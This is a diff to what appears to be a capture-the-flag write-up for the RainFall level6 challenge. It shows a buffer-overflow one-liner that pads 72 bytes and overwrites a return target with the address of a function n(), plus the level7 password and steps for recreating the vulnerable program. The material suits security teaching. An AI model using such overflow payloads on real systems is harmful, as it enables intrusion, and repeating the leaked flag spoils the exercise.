@@ -1,6 +1,3 @@
-level6@RainFall:/tmp$ ~/level6 $(python -c "print('A'*72+'\x08\x04\x84\x54'[::-1])")
-f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
-
 # ------------------------------------------------------------------------
 # Obtain the next password
 # ------------------------------------------------------------------------
@@ -28,6 +25,7 @@ su level7
 # password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 
 
+
 # ------------------------------------------------------------------------
 # Recreate the exploitable program
 # ------------------------------------------------------------------------
@@ -48,7 +46,6 @@ su level7
 	# The function n() is at address 0x08048474
 
 	# Run the program
-	./ft_level6 `python -c "print('A' * 72 + '\x08\x04\x84\x74'[::-1])"`
-
+	/home/user/level7/ft_level6 `python -c "print('A' * 72 + '\x08\x04\x84\x74'[::-1])"`
 
 
